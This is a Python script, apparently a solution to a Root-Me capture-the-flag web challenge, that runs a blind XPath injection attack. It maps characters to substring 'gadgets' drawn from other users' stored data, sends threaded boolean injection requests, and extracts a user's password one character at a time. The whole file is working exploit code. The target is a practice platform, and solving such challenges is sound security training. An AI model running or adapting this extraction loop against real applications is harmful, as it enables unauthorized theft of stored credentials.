import requests
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "http://challenge01.root-me.org/web-serveur/ch24/"
charset = sorted(string.ascii_letters + string.digits + '@.')
true_cond = "Steve's profile"
max_len = 100  # max length of string to extract
max_workers = 10  # number of concurrent threads

mapGadget = {
    'a':'substring(//user[userid=2]/account,1,1)',
    'b':'substring(//user[userid=1]/email,9,1)',
    'c':'substring(//user[userid=3]/email,3,1)',
    'd':'substring(//user[userid=2]/email,6,1)',
    'e':'substring(//user[userid=1]/email,3,1)',
    'f':'None',
    'g':'substring(//user[userid=2]/email,12,1)',
    'h':'substring(//user[userid=2]/email,3,1)',
    'i':'substring(//user[userid=3]/email,2,1)',
    'j':'substring(//user[userid=1]/email,7,1)',
    'k':'None',
    'l':'substring(//user[userid=5]/email,2,1)',
    'm':'substring(//user[userid=4]/email,9,1)',
    'n':'substring(//user[userid=2]/email,4,1)',
    'o':'substring(//user[userid=2]/email,2,1)',
    'p':'None',
    'q':'None',
    'r':'substring(//user[userid=3]/email,1,1)',
    's':'substring(//user[userid=1]/email,1,1)',
    't':'substring(//user[userid=1]/email,2,1)',
    'u':'substring(//user[userid=1]/account,2,1)',
    'v':'substring(//user[userid=1]/email,4,1)',
    'w':'None',
    'x':'None',
    'y':'substring(//user[userid=4]/email,5,1)',
    'z':'substring(//user[userid=3]/email,11,1)',
    '0':'string(0)',
    '1':'string(1)',
    '2':'string(2)',
    '3':'string(3)',
    '4':'string(4)',    
    '5':'string(5)',
    '6':'string(6)',
    '7':'string(7)',
    '8':'string(8)',
    '9':'string(9)',
    'A':'None',
    'B':'None',
    'C':'None',
    'D':'None',
    'E':'substring(//user[userid=3]/username,1,1)',
    'F':'None',
    'G':'None',
    'H':'None',
    'I':'None',
    'J':'substring(//user[userid=2]/username,1,1)',
    'K':'None',
    'L':'None',
    'M':'None',
    'N':'None',
    'O':'None',
    'P':'None',
    'Q':'None',
    'R':'None',
    'S':'substring(//user[userid=1]/username,1,1)',
    'T':'None',
    'U':'None',
    'V':'None',
    'W':'None',
    'X':'None',
    'Y':'None',
    'Z':'None',
    '.':'substring(//user[userid=1]/email,11,1)',
    '@':'substring(//user[userid=3]/email,4,1)',
}

session = requests.Session()

def check_condition(query, pos, ch):
    data = {'msg':'msg'}
    payload = f"?action=user&userid=1 and substring({query},{pos},1)={mapGadget[ch]}"
    try:
        r = session.post(url+payload, data=data, timeout=5)
        # print(f"[i] Checking condition: {query}, pos: {pos}, char: {ch} -> {mapGadget[ch]}")
        return true_cond in r.text
    except requests.RequestException:
        return False

def extract(query):
    """
    Extracts string result of SQL query from position 1 up to max_len.
    Uses threading to speed up extracting multiple positions in parallel.
    """
    result = [""] * max_len  # pre-allocate list for characters

    def worker(pos):
        for ch in charset:
            if check_condition(query, pos, ch):
                return pos, ch
        return pos, None

    print(f"[i] Starting extraction from: {query}")

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(worker, pos) for pos in range(1, max_len + 1)]

        for future in as_completed(futures):
            pos, ch = future.result()
            if ch is None:
                # No char found, treat as end of string
                print(f"[-] No character found at position {pos}, stopping extraction.")
                # Cancel remaining futures (not guaranteed but try)
                for f in futures:
                    f.cancel()
                break
            else:
                result[pos - 1] = ch
                print(f"[+] Position {pos}: {ch}")

    extracted = "".join(result).rstrip("\x00 ").strip()
    print(f"\n[+] Extraction complete:\n{extracted}")
    return extracted

if __name__ == "__main__":
    password1 = extract("//user[userid=2]/password")
